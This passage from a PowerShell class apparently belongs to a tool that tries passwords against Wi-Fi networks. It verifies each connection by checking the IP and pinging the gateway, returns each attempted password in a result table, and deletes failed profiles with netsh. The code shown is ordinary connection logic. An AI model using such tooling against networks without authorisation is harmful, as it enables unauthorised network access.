                                        $pingSuccess = $pingResult
                                        
                                        if ($debugMode) {
                                            $pingResultText = if ($pingSuccess) { 'Success' } else { 'Failed' }
                                            $this.UIManager.ShowDebug("Gateway ping result: $pingResultText")
                                        }
                                    }
                                    catch {
                                        if ($debugMode) {
                                            $this.UIManager.ShowDebug("Gateway ping error: $($_.Exception.Message)")
                                        }
                                    }
                                }
                            }
                            
                            # Connection is successful if:
                            # 1. We're in "connected" state with correct SSID AND
                            # 2. We have valid IP configuration AND
                            # 3. We can ping the gateway (or IP config is valid)
                            if ($hasValidIP -and $pingSuccess) {
                                $connectionSuccess = $true
                                if ($debugMode) {
                                    $this.UIManager.ShowDebug("Connection fully verified on attempt $i")
                                }
                                Write-Verbose "Connection confirmed and verified on attempt $i."
                                break
                            }
                            else {
                                if ($debugMode) {
                                    $this.UIManager.ShowDebug("Connection verification failed - no valid IP or gateway ping failed")
                                }
                            }
                        }
                        else {
                            if ($debugMode) {
                                if ($connectionState -ne "connected") {
                                    $this.UIManager.ShowDebug("Not in connected state: $connectionState")
                                }
                                if ($connectedSSID -ne $ssid) {
                                    $this.UIManager.ShowDebug("Connected to different SSID: '$connectedSSID' instead of '$ssid'")
                                }
                            }
                        }
                    }
                    catch {
                        if ($debugMode) {
                            $this.UIManager.ShowDebug("Error checking connection status: $($_.Exception.Message)")
                        }
                    }
                }
                # --- END OF POLLING LOOP ---
                
                $duration = (Get-Date) - $startTime
                $errorMessage = if ($connectionSuccess) { "" } else { "Connection verification failed after multiple attempts" }
                $result = @{
                    Success      = $connectionSuccess
                    ErrorMessage = $errorMessage
                    Duration     = $duration
                    SSID         = $ssid
                    Password     = $password
                    Verified     = $connectionSuccess
                }
                
                if ($debugMode) {
                    $connectionResult = if ($connectionSuccess) { 'SUCCESS' } else { 'FAILED' }
                    $this.UIManager.ShowDebug("Connection attempt result: $connectionResult")
                    $this.UIManager.ShowDebug("Total duration: $($duration.TotalSeconds) seconds")
                }
                
                # If successful, stay connected (don't disconnect)
                if ($connectionSuccess) {
                    Write-Verbose "Connection successful and verified, staying connected"
                    
                    if ($debugMode) {
                        $this.UIManager.ShowDebug("Connection successful - staying connected to network")
                    }
                    
                    Start-Sleep -Milliseconds 1000  # Brief pause to confirm connection
                }
                
                return $result
            }
            finally {
                # Clean up temporary file
                if (Test-Path $tempProfilePath) {
                    if ($debugMode) {
                        $this.UIManager.ShowDebug("Cleaning up temporary profile file: $tempProfilePath")
                    }
                    Remove-Item -Path $tempProfilePath -Force -ErrorAction SilentlyContinue
                }
                    
                # Delete the profile to clean up
                if (-not $connectionSuccess) {
                    if ($debugMode) {
                        $this.UIManager.ShowDebug("Deleting Wi-Fi profile: netsh wlan delete profile name='$ssid'")
                    }
                    & netsh wlan delete profile name="$ssid" 2>&1 | Out-Null
                }
                else {
                    if ($debugMode) {
                        $this.UIManager.ShowDebug("Keeping successful Wi-Fi profile for '$ssid'")
                    }
                }
            }
        }
        catch [System.TimeoutException] {
            $duration = (Get-Date) - $startTime
            if ($debugMode) {
                $this.UIManager.ShowDebug("Connection attempt timed out after $($duration.TotalSeconds) seconds")
            }
            return @{
                Success      = $false
                ErrorMessage = "Connection attempt timed out after $($duration.TotalSeconds) seconds"
                Duration     = $duration
                SSID         = $ssid
                Password     = $password
                Verified     = $false
            }
        }
        catch {
            $duration = (Get-Date) - $startTime
            if ($debugMode) {
                $this.UIManager.ShowDebug("Connection attempt failed with error: $($_.Exception.Message)")
            }
            return @{
                Success      = $false
                ErrorMessage = "Connection attempt failed: $($_.Exception.Message)"
                Duration     = $duration
                SSID         = $ssid
                Password     = $password
                Verified     = $false
            }
        }
    }
    
    # Validate configuration
    [bool] ValidateConfiguration([hashtable]$config) {
        return $true
    }
    
    # Dispose resources
    [void] Dispose() {
        try {
            Write-Debug "Disposing ApplicationController resources..."
            
            # Dispose all manager instances
            if ($this.UIManager) {
                $this.UIManager.Dispose()
            }
            if ($this.SettingsManager) {
                $this.SettingsManager.Dispose()
            }
            if ($this.NetworkManager) {
                $this.NetworkManager.Dispose()
            }
            if ($this.PasswordManager) {
                $this.PasswordManager.Dispose()
            }
            if ($this.ConfigurationManager) {
                $this.ConfigurationManager.Dispose()
            }
            
            $this.IsInitialized = $false
            Write-Debug "ApplicationController disposed successfully"
        }
        catch {
            Write-Warning "Error during ApplicationController disposal: $($_.Exception.Message)"
        }
    }
}